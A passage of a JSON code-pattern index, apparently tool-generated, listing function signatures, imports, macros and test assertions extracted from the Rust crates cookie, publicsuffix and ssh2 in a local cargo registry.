          "fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {",
          "fn from(error: Utf8Error) -> ParseError {",
          "fn description(&self) -> &str {",
          "fn name_val_decoded(",
          "fn name_val_decoded(",
          "fn trim_quotes(s: &str) -> &str {",
          "fn parse_inner<'c>(s: &str, decode: bool) -> Result<Cookie<'c>, ParseError> {",
          "fn parse_same_site() {",
          "fn parse() {",
          "fn parse_abbreviated_years() {",
          "fn parse_variant_date_fmts() {",
          "fn parse_very_large_max_ages() {",
          "fn odd_characters() {",
          "fn odd_characters_encoded() {",
          "fn do_not_panic_on_large_max_ages() {"
        ],
        "struct_defs": [],
        "impl_blocks": [
          "impl ParseError {",
          "impl fmt::Display for ParseError {",
          "impl From<Utf8Error> for ParseError {",
          "impl Error for ParseError {"
        ],
        "uses": [
          "use std::borrow::Cow;",
          "use std::error::Error;",
          "use std::convert::{From, TryFrom};",
          "use std::str::Utf8Error;",
          "use std::fmt;",
          "use std::ascii::AsciiExt;",
          "use percent_encoding::percent_decode;",
          "use time::{PrimitiveDateTime, Duration, OffsetDateTime};",
          "use time::{parsing::Parsable, macros::format_description, format_description::FormatItem};",
          "use crate::{Cookie, SameSite, CookieStr};",
          "use super::parse_date;",
          "use crate::{Cookie, SameSite};",
          "use time::Duration;"
        ],
        "macros": [
          "pub static FMT1: &[FormatItem<'_>] = format_description!(\"[weekday repr:short], ",
          "pub static FMT2: &[FormatItem<'_>] = format_description!(\"[weekday], [day]-[mont",
          "pub static FMT3: &[FormatItem<'_>] = format_description!(\"[weekday repr:short] [",
          "pub static FMT4: &[FormatItem<'_>] = format_description!(\"[weekday repr:short], ",
          "write!(f, \"{}\", self.as_str())",
          "unreachable!(\"This function should never be called with 'percent-encode' disable",
          "Err(e) => panic!(\"Failed to parse {:?}: {:?}\", $string, e)",
          "assert_eq!(cookie, $expected);",
          "Err(e) => panic!(\"Failed to parse {:?}: {:?}\", $string, e)",
          "assert_ne!(cookie, $expected);",
          "assert_eq_parse!(\"foo=bar; SameSite=Lax\", expected);",
          "assert_eq_parse!(\"foo=bar; SameSite=lax\", expected);",
          "assert_eq_parse!(\"foo=bar; SameSite=LAX\", expected);",
          "assert_eq_parse!(\"foo=bar; samesite=Lax\", expected);",
          "assert_eq_parse!(\"foo=bar; SAMESITE=Lax\", expected);",
          "assert_eq_parse!(\"foo=bar; SameSite=Strict\", expected);",
          "assert_eq_parse!(\"foo=bar; SameSITE=Strict\", expected);",
          "assert_eq_parse!(\"foo=bar; SameSite=strict\", expected);",
          "assert_eq_parse!(\"foo=bar; SameSite=STrICT\", expected);",
          "assert_eq_parse!(\"foo=bar; SameSite=STRICT\", expected);",
          "assert_eq_parse!(\"foo=bar; SameSite=None\", expected);",
          "assert_eq_parse!(\"foo=bar; SameSITE=none\", expected);",
          "assert_eq_parse!(\"foo=bar; SameSite=NOne\", expected);",
          "assert_eq_parse!(\"foo=bar; SameSite=nOne\", expected);",
          "assert!(Cookie::parse(\"bar\").is_err());",
          "assert!(Cookie::parse(\"=bar\").is_err());",
          "assert!(Cookie::parse(\" =bar\").is_err());",
          "assert!(Cookie::parse(\"foo=\").is_ok());",
          "assert_eq_parse!(\"foo=bar=baz\", expected);",
          "assert_eq_parse!(\"foo=\\\"\\\"bar\\\"\\\"\", expected);",
          "assert_eq_parse!(\"foo=  \\\"bar\", expected);",
          "assert_eq_parse!(\"foo=\\\"bar  \", expected);",
          "assert_eq_parse!(\"foo=\\\"\\\"bar\\\"\", expected);",
          "assert_eq_parse!(\"foo=\\\"\\\"bar  \\\"\", expected);",
          "assert_eq_parse!(\"foo=\\\"\\\"bar  \\\"  \", expected);",
          "assert_eq_parse!(\"foo=bar\\\"\", expected);",
          "assert_eq_parse!(\"foo=\\\"bar\\\"\\\"\", expected);",
          "assert_eq_parse!(\"foo=\\\"  bar\\\"\\\"\", expected);",
          "assert_eq_parse!(\"foo=\\\"  bar\\\"  \\\"  \", expected);",
          "assert_eq_parse!(\"foo=bar\", expected);",
          "assert_eq_parse!(\"foo = bar\", expected);",
          "assert_eq_parse!(\"foo=\\\"bar\\\"\", expected);",
          "assert_eq_parse!(\" foo=bar \", expected);",
          "assert_eq_parse!(\" foo=\\\"bar   \\\" \", expected);",
          "assert_eq_parse!(\" foo=bar ;Domain=\", expected);",
          "assert_eq_parse!(\" foo=bar ;Domain= \", expected);",
          "assert_eq_parse!(\" foo=bar ;Ignored\", expected);",
          "assert_ne_parse!(\" foo=bar ;HttpOnly\", unexpected);",
          "assert_ne_parse!(\" foo=bar; httponly\", unexpected);",
          "assert_eq_parse!(\" foo=bar ;HttpOnly\", expected);",
          "assert_eq_parse!(\" foo=bar ;httponly\", expected);",
          "assert_eq_parse!(\" foo=bar ;HTTPONLY=whatever\", expected);",
          "assert_eq_parse!(\" foo=bar ; sekure; HTTPONLY\", expected);",
          "assert_eq_parse!(\" foo=bar ;HttpOnly; Secure\", expected);",
          "assert_eq_parse!(\" foo=bar ;HttpOnly; Secure=aaaa\", expected);",
          "assert_ne_parse!(\" foo=bar ;HttpOnly; skeure\", unexpected);",
          "assert_ne_parse!(\" foo=bar ;HttpOnly; =secure\", unexpected);",
          "assert_ne_parse!(\" foo=bar ;HttpOnly;\", unexpected);",
          "assert_ne_parse!(\" foo=bar ;HttpOnly; secure\", unexpected);",
          "assert_ne_parse!(\" foo=bar ;HttpOnly; secure\", unexpected);",
          "assert_ne_parse!(\" foo=bar ;HttpOnly; secure\", unexpected);",
          "assert_eq_parse!(\" foo=bar ;HttpOnly; Secure; Max-Age=0\", expected);",
          "assert_eq_parse!(\" foo=bar ;HttpOnly; Secure; Max-Age = 0 \", expected);",
          "assert_eq_parse!(\" foo=bar ;HttpOnly; Secure; Max-Age=-1\", expected);",
          "assert_eq_parse!(\" foo=bar ;HttpOnly; Secure; Max-Age = -1 \", expected);",
          "assert_eq_parse!(\" foo=bar ;HttpOnly; Secure; Max-Age=60\", expected);",
          "assert_eq_parse!(\" foo=bar ;HttpOnly; Secure; Max-Age =   60 \", expected);",
          "assert_eq_parse!(\" foo=bar ;HttpOnly; Secure; Max-Age=4\", expected);",
          "assert_eq_parse!(\" foo=bar ;HttpOnly; Secure; Max-Age = 4 \", expected);",
          "assert_ne_parse!(\" foo=bar ;HttpOnly; Secure; Max-Age=122\", unexpected);",
          "assert_ne_parse!(\" foo=bar ;HttpOnly; Secure; Max-Age = 38 \", unexpected);",
          "assert_ne_parse!(\" foo=bar ;HttpOnly; Secure; Max-Age=51\", unexpected);",
          "assert_ne_parse!(\" foo=bar ;HttpOnly; Secure; Max-Age = -1 \", unexpected);",
          "assert_ne_parse!(\" foo=bar ;HttpOnly; Secure; Max-Age = 0\", unexpected);",
          "assert_eq_parse!(\"foo=bar;HttpOnly; Secure; Max-Age=4; Path=/\", expected);",
          "assert_eq_parse!(\"foo=bar;HttpOnly; Secure; Max-Age=4;Path=/\", expected);",
          "assert_eq_parse!(\"foo=bar;HttpOnly; Secure; Max-Age=4; Path=/foo\", expected);",
          "assert_eq_parse!(\"foo=bar;HttpOnly; Secure; Max-Age=4;Path=/foo\", expected);",
          "assert_eq_parse!(\"foo=bar;HttpOnly; Secure; Max-Age=4;path=/foo\", expected);",
          "assert_eq_parse!(\"foo=bar;HttpOnly; Secure; Max-Age=4;path = /foo\", expected);",
          "assert_ne_parse!(\"foo=bar;HttpOnly; Secure; Max-Age=4; Path=/foo\", unexpected);",
          "assert_ne_parse!(\"foo=bar;HttpOnly; Secure; Max-Age=4;Path=/baz\", unexpected);",
          "assert_eq_parse!(\" foo=bar ;HttpOnly; Secure; Max-Age=4; Path=/foo; \\",
          "assert_eq_parse!(\" foo=bar ;HttpOnly; Secure; Max-Age=4; Path=/foo; \\",
          "assert_eq_parse!(\" foo=bar ;HttpOnly; Secure; Max-Age=4; Path=/foo; \\",
          "assert_eq_parse!(\" foo=bar ;HttpOnly; Secure; Max-Age=4; Path=/foo; \\",
          "assert_eq_parse!(\" foo=bar ;HttpOnly; Secure; Max-Age=4; Path=/foo; \\",
          "assert_ne_parse!(\" foo=bar ;HttpOnly; Secure; Max-Age=4; Path=/foo; \\",
          "assert_ne_parse!(\" foo=bar ;HttpOnly; Secure; Max-Age=4; Path=/foo; \\",
          "assert_eq_parse!(\" foo=bar ;HttpOnly; Secure; Max-Age=4; Path=/foo; \\",
          "assert_ne_parse!(\" foo=bar ;HttpOnly; Secure; Max-Age=4; Path=/foo; \\",
          "assert_eq!(cookie.expires_datetime().unwrap().year(), 2020);",
          "assert_eq!(cookie.expires_datetime().unwrap().year(), 2068);",
          "assert_eq!(cookie.expires_datetime().unwrap().year(), 1969);",
          "assert_eq!(cookie.expires_datetime().unwrap().year(), 1999);",
          "assert_eq!(cookie.expires_datetime().unwrap().year(), 2069);",
          "let string = format!(\"foo=bar; Max-Age={}\", 1u128 << 100);",
          "assert_eq_parse!(&string, expected);",
          "assert_eq_parse!(\"foo=bar; Max-Age=-129\", expected);",
          "let string = format!(\"foo=bar; Max-Age=-{}\", 1u128 << 100);",
          "assert_eq_parse!(&string, expected);",
          "let string = format!(\"foo=bar; Max-Age=-{}\", i64::max_value());",
          "assert_eq_parse!(&string, expected);",
          "let string = format!(\"foo=bar; Max-Age={}\", i64::max_value());",
          "assert_eq_parse!(&string, expected);",
          "assert_eq_parse!(\"foo=b%2Fr\", expected);",
          "Err(e) => panic!(\"Failed to parse: {:?}\", e)",
          "assert_eq!(cookie, expected);",
          "assert_eq_parse!(format!(\" foo=bar; Max-Age={:?}\", too_many_seconds), expected);"
        ],
        "derives": [
          "#[derive(Debug, PartialEq, Eq, Clone, Copy)]"
        ],
        "error_handling": 34
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/cookie-0.17.0/src/delta.rs",
        "function_defs": [
          "fn deref(&self) -> &Cookie<'static> {",
          "fn deref_mut(&mut self) -> &mut Cookie<'static> {",
          "fn eq(&self, other: &DeltaCookie) -> bool {",
          "fn hash<H: Hasher>(&self, state: &mut H) {",
          "fn borrow(&self) -> &str {"
        ],
        "struct_defs": [],
        "impl_blocks": [
          "impl DeltaCookie {",
          "impl Deref for DeltaCookie {",
          "impl DerefMut for DeltaCookie {",
          "impl PartialEq for DeltaCookie {",
          "impl Eq for DeltaCookie {}",
          "impl Hash for DeltaCookie {",
          "impl Borrow<str> for DeltaCookie {"
        ],
        "uses": [
          "use std::ops::{Deref, DerefMut};",
          "use std::hash::{Hash, Hasher};",
          "use std::borrow::Borrow;",
          "use crate::Cookie;"
        ],
        "macros": [],
        "derives": [
          "#[derive(Clone, Debug)]"
        ],
        "error_handling": 0
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/cookie-0.17.0/src/builder.rs",
        "function_defs": [],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use std::borrow::Cow;",
          "use crate::{Cookie, SameSite, Expiration};"
        ],
        "macros": [
          "/// assert_eq!(c.name_value(), (\"foo\", \"bar\"));",
          "/// assert!(c.expires().is_some());",
          "/// assert_eq!(c.expires(), Some(Expiration::Session));",
          "/// assert_eq!(c.max_age(), Some(Duration::seconds(30 * 60)));",
          "/// assert_eq!(c.domain(), Some(\"www.rust-lang.org\"));",
          "/// assert_eq!(c.path(), Some(\"/\"));",
          "/// assert_eq!(c.secure(), Some(true));",
          "/// assert_eq!(c.http_only(), Some(true));",
          "/// assert_eq!(c.same_site(), Some(SameSite::Strict));",
          "/// assert_eq!(c.max_age(), Some(Duration::days(365 * 20)));",
          "/// # assert!(c.expires().is_some());",
          "/// assert_eq!(c.name_value(), (\"foo\", \"bar\"));",
          "/// assert_eq!(c.domain(), Some(\"crates.io\"));",
          "/// assert_eq!(c.path(), Some(\"/\"));"
        ],
        "derives": [
          "#[derive(Debug, Clone)]"
        ],
        "error_handling": 0
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/cookie-0.17.0/src/secure/key.rs",
        "function_defs": [
          "fn eq(&self, other: &Self) -> bool {",
          "fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {",
          "fn try_from(key: &[u8]) -> Result<Self, Self::Error> {",
          "fn from_works() {",
          "fn try_from_works() {",
          "fn deterministic_derive() {",
          "fn non_deterministic_generate() {"
        ],
        "struct_defs": [],
        "impl_blocks": [
          "impl PartialEq for Key {",
          "impl Key {",
          "impl std::error::Error for KeyError { }",
          "impl std::fmt::Display for KeyError {",
          "impl TryFrom<&[u8]> for Key {"
        ],
        "uses": [
          "use std::convert::TryFrom;",
          "use subtle::ConstantTimeEq;",
          "use crate::secure::rand::RngCore;",
          "use super::Key;",
          "use core::convert::TryInto;"
        ],
        "macros": [
          "const_assert!(crate::secure::signed::KEY_LEN == SIGNING_KEY_LEN);",
          "const_assert!(crate::secure::private::KEY_LEN == ENCRYPTION_KEY_LEN);",
          "panic!(\"bad master key length: expected >= 32 bytes, found {}\", master_key.len()",
          "write!(f, \"key material is too short: expected >= {} bytes, got {} bytes\",",
          "/// assert!(Key::try_from(key).is_ok());",
          "/// assert!(Key::try_from(key).is_err());",
          "assert_eq!(key.signing(), &*signing);",
          "assert_eq!(key.encryption(), &*encryption);",
          "assert!(key_res.is_err());",
          "assert!(key_res.is_ok());",
          "assert_eq!(key_a.signing(), key_b.signing());",
          "assert_eq!(key_a.encryption(), key_b.encryption());",
          "assert_ne!(key_a.encryption(), key_a.signing());",
          "assert_ne!(key_2.signing(), key_a.signing());",
          "assert_ne!(key_2.encryption(), key_a.encryption());",
          "assert_ne!(key_a.signing(), key_b.signing());",
          "assert_ne!(key_a.encryption(), key_b.encryption());"
        ],
        "derives": [
          "#[derive(Clone)]",
          "#[derive(Debug)]"
        ],
        "error_handling": 3
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/cookie-0.17.0/src/secure/private.rs",
        "function_defs": [
          "fn encrypt_cookie(&self, cookie: &mut Cookie) {",
          "fn unseal(&self, name: &str, value: &str) -> Result<String, &'static str> {",
          "fn simple() {",
          "fn secure() {",
          "fn roundtrip() {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use std::convert::TryInto;",
          "use std::borrow::{Borrow, BorrowMut};",
          "use crate::secure::{base64, rand, Key};",
          "use crate::{Cookie, CookieJar};",
          "use self::aes_gcm::aead::{generic_array::GenericArray, Aead, AeadInPlace, KeyInit, Payload};",
          "use self::aes_gcm::Aes256Gcm;",
          "use self::rand::RngCore;",
          "use crate::{CookieJar, Cookie, Key};"
        ],
        "macros": [
          "/// assert!(jar.private(&key).get(\"name\").is_none());",
          "/// assert_eq!(jar.private(&key).get(\"name\").unwrap().value(), \"value\");",
          "/// assert_ne!(plain.value(), \"value\");",
          "/// assert_eq!(decrypted.value(), \"value\");",
          "/// assert!(jar.private(&key).decrypt(plain).is_none());",
          "/// assert!(jar.private(&key).get(\"name\").is_none());",
          "/// assert_eq!(private_jar.get(\"name\").unwrap().value(), \"value\");",
          "/// assert_ne!(jar.get(\"name\").unwrap().value(), \"value\");",
          "/// assert_eq!(jar.private(&key).get(\"name\").unwrap().value(), \"value\");",
          "/// assert_eq!(jar.iter().count(), 1);",
          "/// assert_eq!(jar.delta().count(), 0);",
          "/// assert!(private_jar.get(\"name\").is_some());",
          "/// assert!(private_jar.get(\"name\").is_none());",
          "assert_simple_behaviour!(jar, jar.private_mut(&key));",
          "assert_secure_behaviour!(jar, jar.private_mut(&key));",
          "assert_eq!(private.get(\"encrypted_with_ring014\").unwrap().value(), \"Tamper-proof",
          "assert_eq!(private.get(\"encrypted_with_ring016\").unwrap().value(), \"Tamper-proof"
        ],
        "derives": [],
        "error_handling": 9
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/cookie-0.17.0/src/secure/mod.rs",
        "function_defs": [],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use base64::{DecodeError, Engine, prelude::BASE64_STANDARD};"
        ],
        "macros": [],
        "derives": [],
        "error_handling": 0
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/cookie-0.17.0/src/secure/macros.rs",
        "function_defs": [],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [],
        "macros": [
          "assert_eq!($clear.iter().count(), 0);",
          "assert_eq!($clear.iter().count(), 1);",
          "assert_eq!($secure.get(\"name\").unwrap().value(), \"val\");",
          "assert_ne!($clear.get(\"name\").unwrap().value(), \"val\");",
          "assert_eq!($clear.iter().count(), 2);",
          "assert_eq!($clear.iter().count(), 1);",
          "assert_eq!($clear.iter().count(), 0);",
          "assert!($clear.get(\"secure\").unwrap().value() != \"secure\");",
          "assert!($secure.get(\"secure\").unwrap().value() == \"secure\");",
          "let new_val = format!(\"{}l\", cookie.value());",
          "assert!($secure.get(\"secure\").is_none());",
          "assert!($secure.get(\"secure\").is_none());"
        ],
        "derives": [],
        "error_handling": 7
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/cookie-0.17.0/src/secure/signed.rs",
        "function_defs": [
          "fn sign_cookie(&self, cookie: &mut Cookie) {",
          "fn _verify(&self, cookie_value: &str) -> Result<String, &'static str> {",
          "fn simple() {",
          "fn private() {",
          "fn roundtrip() {",
          "fn issue_178() {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use std::convert::TryInto;",
          "use std::borrow::{Borrow, BorrowMut};",
          "use sha2::Sha256;",
          "use hmac::{Hmac, Mac};",
          "use crate::secure::{base64, Key};",
          "use crate::{Cookie, CookieJar};",
          "use crate::{CookieJar, Cookie, Key};"
        ],
        "macros": [
          "/// assert!(jar.signed(&key).get(\"name\").is_none());",
          "/// assert_eq!(jar.signed(&key).get(\"name\").unwrap().value(), \"value\");",
          "/// assert_ne!(plain.value(), \"value\");",
          "/// assert_eq!(verified.value(), \"value\");",
          "/// assert!(jar.signed(&key).verify(plain).is_none());",
          "/// assert!(jar.signed(&key).get(\"name\").is_none());",
          "/// assert_eq!(signed_jar.get(\"name\").unwrap().value(), \"value\");",
          "/// assert_ne!(jar.get(\"name\").unwrap().value(), \"value\");",
          "/// assert!(jar.get(\"name\").unwrap().value().contains(\"value\"));",
          "/// assert_eq!(jar.signed(&key).get(\"name\").unwrap().value(), \"value\");",
          "/// assert_eq!(jar.iter().count(), 1);",
          "/// assert_eq!(jar.delta().count(), 0);",
          "/// assert!(signed_jar.get(\"name\").is_some());",
          "/// assert!(signed_jar.get(\"name\").is_none());",
          "assert_simple_behaviour!(jar, jar.signed_mut(&key));",
          "assert_secure_behaviour!(jar, jar.signed_mut(&key));",
          "assert_eq!(signed.get(\"signed_with_ring014\").unwrap().value(), \"Tamper-proof\");",
          "assert_eq!(signed.get(\"signed_with_ring016\").unwrap().value(), \"Tamper-proof\");",
          "assert!(signed.verify(c).is_none());"
        ],
        "derives": [],
        "error_handling": 10
      }
    ],
    "ts_patterns": []
  },
  {
    "project": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/publicsuffix-2.3.0",
    "name": "publicsuffix-2.3.0",
    "languages": [
      "Rust"
    ],
    "python_patterns": [],
    "rust_patterns": [
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/publicsuffix-2.3.0/tests/list.rs",
        "function_defs": [
          "fn list_behaviour() {",
          "fn msg(s: String) -> &'static str {",
          "fn val(s: &Option<String>) -> String {",
          "fn expected_tld(input: &str) -> bool {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use publicsuffix::{List, Psl, Type};",
          "use rspec::report::ExampleResult;",
          "use std::sync::LazyLock;",
          "use std::{env, mem, str};"
        ],
        "macros": [
          "LazyLock::new(|| include_str!(\"public_suffix_list.dat\").parse().unwrap());",
          "for (i, line) in include_str!(\"tests.txt\").lines().enumerate() {",
          "None => panic!(\"line {} of the test file doesn't seem to be valid\", i),",
          "|| (cfg!(not(feature = \"punycode\")) && input.contains(\"xn--\"))",
          "None => panic!(\"line {} of the test file doesn't seem to be valid\", i),",
          "ctx.when(msg(format!(\"input is `{}`\", input)), |ctx| {",
          "ctx.it(msg(format!(\"means the root domain {}\", val(&expected_root))), move |_| {",
          "let msg = format!(\"expected `{:?}` but found `{:?}` on line {} of `test_psl.txt`",
          "ctx.it(msg(format!(\"also means the suffix {}\", val(&expected_suffix))), move |_|",
          "let msg = format!(\"expected `{:?}` but found `{:?}` on line {} of `test_psl.txt`",
          "ctx.when(msg(format!(\"input is `{}`\", input)), |ctx| {",
          "msg(format!(",
          "let msg = format!(",
          "ctx.when(msg(format!(\"input is `{}`\", input)), |ctx| {",
          "msg(format!(",
          "assert_eq!(suffix.typ(), typ);",
          "let msg = format!(",
          "Some(ref v) => format!(\"should be `{}`\", v),",
          "None => format!(\"is invalid\"),"
        ],
        "derives": [],
        "error_handling": 14
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/publicsuffix-2.3.0/benches/benches.rs",
        "function_defs": [
          "fn bench_find(b: &mut Bencher) {",
          "fn bench_suffix(b: &mut Bencher) {",
          "fn bench_domain(b: &mut Bencher) {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use publicsuffix::{List, Psl};",
          "use test::Bencher;"
        ],
        "macros": [
          "static ref LIST: List = include_str!(\"../tests/public_suffix_list.dat\").parse()."
        ],
        "derives": [],
        "error_handling": 3
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/publicsuffix-2.3.0/src/error.rs",
        "function_defs": [
          "fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {"
        ],
        "struct_defs": [],
        "impl_blocks": [
          "impl fmt::Display for Error {",
          "impl std::error::Error for Error {}"
        ],
        "uses": [
          "use alloc::string::String;",
          "use core::fmt;"
        ],
        "macros": [
          "Error::EmptyLabel(rule) => write!(f, \"rule `{}` contains an empty label\", rule),",
          "write!(f, \"`{}`; exceptions only valid at end of rule\", rule)",
          "Error::InvalidList => write!(f, \"the provided list is not valid\"),",
          "Error::InvalidRule(rule) => write!(f, \"rule `{}` is invalid\", rule),",
          "Error::ListNotUtf8Encoded => write!(f, \"the provided list is not UTF8 encoded\"),"
        ],
        "derives": [
          "#[derive(Clone, Eq, PartialEq, Ord, PartialOrd, Hash, Debug)]"
        ],
        "error_handling": 1
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/publicsuffix-2.3.0/src/lib.rs",
        "function_defs": [
          "fn append(&mut self, mut rule: &str, typ: Type) -> Result<(), Error> {",
          "fn find<'a, T>(&self, mut labels: T) -> Info",
          "fn from_str(s: &str) -> Result<Self, Self::Err> {",
          "fn from(mut list: List) -> Self {",
          "fn from(IcannList(mut list): IcannList) -> Self {",
          "fn from_str(s: &str) -> Result<Self, Self::Err> {",
          "fn find<'a, T>(&self, labels: T) -> Info",
          "fn from(mut list: List) -> Self {",
          "fn from(PrivateList(mut list): PrivateList) -> Self {",
          "fn from_str(s: &str) -> Result<Self, Self::Err> {",
          "fn find<'a, T>(&self, labels: T) -> Info",
          "fn list_construction() {",
          "fn find_localhost() {",
          "fn find_uk() {",
          "fn find_com_uk() {",
          "fn find_ide_kyoto_jp() {"
        ],
        "struct_defs": [
          "struct Node {",
          "struct Leaf {"
        ],
        "impl_blocks": [
          "impl List {",
          "impl Psl for List {",
          "impl FromStr for List {",
          "impl From<List> for IcannList {",
          "impl From<IcannList> for List {",
          "impl IcannList {",
          "impl FromStr for IcannList {",
          "impl Psl for IcannList {",
          "impl From<List> for PrivateList {",
          "impl From<PrivateList> for List {",
          "impl PrivateList {",
          "impl FromStr for PrivateList {",
          "impl Psl for PrivateList {"
        ],
        "uses": [
          "use alloc::borrow::Cow;",
          "use alloc::borrow::ToOwned;",
          "use alloc::collections::BTreeMap as Map;",
          "use alloc::vec::Vec;",
          "use core::str::{from_utf8, FromStr};",
          "use hashbrown::HashMap as Map;",
          "use std::collections::HashMap as Map;",
          "use unicase::UniCase;",
          "use super::*;"
        ],
        "macros": [
          "let node_opt = rules.children.get(&anycase_key!(label));",
          "let node_opt = rules.children.get(&anycase_key!(label));",
          "assert_eq!(list, expected);",
          "assert_eq!(list.find(labels), Info { len: 9, typ: None });",
          "assert_eq!(list.find(labels), Info { len: 2, typ: None });",
          "assert_eq!(",
          "assert_eq!("
        ],
        "derives": [
          "#[derive(Debug, Clone, Default, Eq, PartialEq)]",
          "#[derive(Debug, Clone, Copy, Eq, PartialEq)]",
          "#[derive(Debug, Clone, Default, Eq, PartialEq)]",
          "#[derive(Debug, Clone, Default, Eq, PartialEq)]",
          "#[derive(Debug, Clone, Default, Eq, PartialEq)]"
        ],
        "error_handling": 21
      }
    ],
    "ts_patterns": []
  },
  {
    "project": "/Volumes/Plex/DevSymlinks/venvs/RVC_venv/lib/python3.11/site-packages/numpy/linalg",
    "name": "linalg",
    "languages": [
      "Python"
    ],
    "python_patterns": [],
    "rust_patterns": [],
    "ts_patterns": []
  },
  {
    "project": "/Volumes/Plex/DevSymlinks/venvs/SAM_voice_venv/lib/python3.11/site-packages/numpy/linalg",
    "name": "linalg",
    "languages": [
      "Python"
    ],
    "python_patterns": [],
    "rust_patterns": [],
    "ts_patterns": []
  },
  {
    "project": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/ssh2-0.9.5",
    "name": "ssh2-0.9.5",
    "languages": [
      "Rust"
    ],
    "python_patterns": [],
    "rust_patterns": [
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/ssh2-0.9.5/src/session.rs",
        "function_defs": [
          "fn prompt<'a>(",
          "fn strdup_string(s: &str) -> *mut c_char {",
          "fn inner(&self) -> MutexGuard<SessionInner> {",
          "fn as_raw_fd(&self) -> RawFd {",
          "fn as_raw_socket(&self) -> RawSocket {",
          "fn drop(&mut self) {"
        ],
        "struct_defs": [],
        "impl_blocks": [
          "impl Session {",
          "impl AsRawFd for Session {",
          "impl AsRawSocket for Session {",
          "impl SessionInner {",
          "impl Drop for SessionInner {",
          "impl ScpFileStat {"
        ],
        "uses": [
          "use libc::size_t;",
          "use libc::{self, c_char, c_int, c_long, c_uint, c_void};",
          "use parking_lot::{MappedMutexGuard, Mutex, MutexGuard};",
          "use std::borrow::Cow;",
          "use std::ffi::CString;",
          "use std::ptr::{null, null_mut};",
          "use std::mem;",
          "use std::os::unix::io::{AsRawFd, RawFd};",
          "use std::os::windows::io::{AsRawSocket, RawSocket};",
          "use std::path::Path;",
          "use std::slice;",
          "use std::str;",
          "use std::sync::Arc;",
          "use util;",
          "use {raw, ByApplication, DisconnectCode, Error, ErrorCode, HostKeyType};",
          "use {Agent, Channel, HashType, KnownHosts, Listener, MethodType, Sftp};",
          "use std::panic::{catch_unwind, AssertUnwindSafe};"
        ],
        "macros": [
          "None => panic!(\"tried to obtain raw fd without tcp stream set\"),",
          "None => panic!(\"tried to obtain raw socket without tcp stream set\"),"
        ],
        "derives": [
          "#[derive(PartialEq, Eq, PartialOrd, Ord, Hash, Debug, Clone, Copy)]",
          "#[derive(Debug)]",
          "#[derive(Clone)]",
          "#[derive(Debug, PartialEq)]"
        ],
        "error_handling": 58
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/ssh2-0.9.5/src/util.rs",
        "function_defs": [
          "fn check(b: Cow<[u8]>) -> Result<Cow<[u8]>, Error> {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use std::borrow::Cow;",
          "use std::path::Path;",
          "use {raw, Error, ErrorCode};",
          "use std::ffi::OsStr;",
          "use std::os::unix::prelude::*;"
        ],
        "macros": [],
        "derives": [],
        "error_handling": 0
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/ssh2-0.9.5/src/channel.rs",
        "function_defs": [
          "fn lock(&self) -> LockedChannel {",
          "fn write(&mut self, buf: &[u8]) -> io::Result<usize> {",
          "fn flush(&mut self) -> io::Result<()> {",
          "fn read(&mut self, buf: &mut [u8]) -> io::Result<usize> {",
          "fn drop(&mut self) {",
          "fn lock(&self) -> LockedStream {",
          "fn read(&mut self, data: &mut [u8]) -> io::Result<usize> {",
          "fn write(&mut self, data: &[u8]) -> io::Result<usize> {",
          "fn flush(&mut self) -> io::Result<()> {"
        ],
        "struct_defs": [
          "struct ChannelInner {",
          "struct LockedChannel<'a> {",
          "struct LockedStream<'a> {"
        ],
        "impl_blocks": [
          "impl Channel {",
          "impl Channel {",
          "impl Write for Channel {",
          "impl Read for Channel {",
          "impl Drop for ChannelInner {",
          "impl Stream {",
          "impl Read for Stream {",
          "impl Write for Stream {"
        ],
        "uses": [
          "use libc::{c_char, c_int, c_uchar, c_uint, c_ulong, c_void, size_t};",
          "use parking_lot::{Mutex, MutexGuard};",
          "use std::cmp;",
          "use std::ffi::CString;",
          "use std::ptr::{null, null_mut};",
          "use std::io;",
          "use std::io::prelude::*;",
          "use std::slice;",
          "use std::sync::Arc;",
          "use {raw, Error, ExtendedData, PtyModes, SessionInner};"
        ],
        "macros": [
          "/// # let session: Session = panic!();",
          "/// println!(\"{}\", s);"
        ],
        "derives": [
          "#[derive(Clone)]",
          "#[derive(Clone)]",
          "#[derive(Copy, Clone)]",
